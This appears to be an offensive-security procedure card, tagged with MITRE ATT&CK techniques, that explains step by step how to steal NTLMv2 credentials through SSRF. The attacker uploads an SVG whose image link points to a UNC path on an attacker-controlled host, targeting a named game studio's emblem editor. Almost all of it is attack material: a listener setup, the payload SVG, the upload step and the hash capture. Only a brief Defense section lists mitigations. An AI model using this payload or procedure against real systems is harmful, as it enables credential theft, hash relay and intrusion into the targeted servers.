---
id: proc-uuid-001
tags:
  - ssrf
  - smb
  - imagemagick
  - unc-path
  - ntlm
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Pass the Hash]]'
updated_at: '2025-12-14T17:23:53.876Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Pass the Hash]]'
---
# Craft-and-Submit-Malicious-SVG-for-SSRF

## Summary

This procedure exploits a Server-Side Request Forgery (SSRF) vulnerability in web applications that process user-uploaded SVG files with ImageMagick, by embedding UNC paths that force the server to authenticate over SMB to an attacker-controlled endpoint, exposing domain credentials and NTLMv2 hashes for further attacks like password cracking or relay exploitation.

## Description

In the context of Rockstar Games' emblem editor, users can upload SVG files for custom designs. ImageMagick, used for rendering, processes external references in SVGs. By crafting an SVG with a UNC path (e.g., \\attacker-ip\share), the server attempts to fetch the resource over SMB, authenticating with its domain credentials. The attacker captures these via a listening service, enabling offline cracking of the NTLMv2 hash or relaying to other systems for privilege escalation, potentially leading to RCE. Prerequisites include access to the upload feature and control over an external SMB listener. Outcomes include credential exposure without direct server access.

## Requirements

1. Valid user access to the web application's SVG upload endpoint (e.g., emblem editor)
2. Server-side processing with ImageMagick or librsvg that resolves UNC paths
3. Attacker-controlled network endpoint for SMB (e.g., public IP with port 445 open)
4. Optional: Tools like Responder for capturing NTLM hashes

## Defense

Defensive measures and detection strategies:

- Validate and sanitize SVG inputs to block UNC paths and external references
- Configure ImageMagick with policies to deny network access (e.g., policy.xml restricting URL protocols)
- Monitor outbound SMB traffic from web servers and log authentication attempts
- Use web application firewalls (WAF) to inspect uploads for malicious patterns like \\ in XML attributes

## Objectives

1. Trigger SSRF to force server-initiated SMB connection
2. Capture NTLMv2 authentication hash
3. Enable post-exploitation like hash cracking or SMB relay to internal resources

## Instructions

### Step 1: Set Up SMB Listener

**Context**: Prepare the attacker's side to receive and capture the SMB authentication attempt. Use a tool like Responder or Impacket's smbserver to listen on port 445.

No specific command provided in source; manually configure a listener (e.g., run Responder in SMB mode on attacker machine).

> Expected: Listener active, ready to log incoming connections and hashes.

### Step 2: Craft Malicious SVG File

**Context**: Create an SVG file embedding a UNC path that ImageMagick will process, tricking the server into SMB access.

Use a text editor to generate the SVG. Example content:

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <image xlink:href="\\\\attacker-ip\\evil\\dummy.svg" x="0" y="0" height="100" width="100"/>
</svg>
```

Replace `attacker-ip` with your controlled IP. Save as `malicious.svg`.

> Explanation: The `xlink:href` attribute with UNC path (double backslashes escaped) causes ImageMagick to attempt fetching over SMB, authenticating as the server user.

### Step 3: Submit SVG to Emblem Editor

**Context**: Upload the crafted SVG via the web application's upload interface to trigger processing.

Navigate to the emblem editor, select the upload option, and submit `malicious.svg`. No command needed; use browser form.

> Expected: Server processes SVG, initiates SMB to attacker-ip, captured on listener.

### Step 4: Capture and Analyze Response

**Context**: Monitor the listener for the incoming NTLMv2 hash and credentials.

Review logs from the SMB listener for authentication details, including username, domain, and hash.

> Expected Output: Captured hash like `username::domain:challenge:hash:...

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Credential Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Pass the Hash]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- ssrf
- smb
- imagemagick
- ntlm
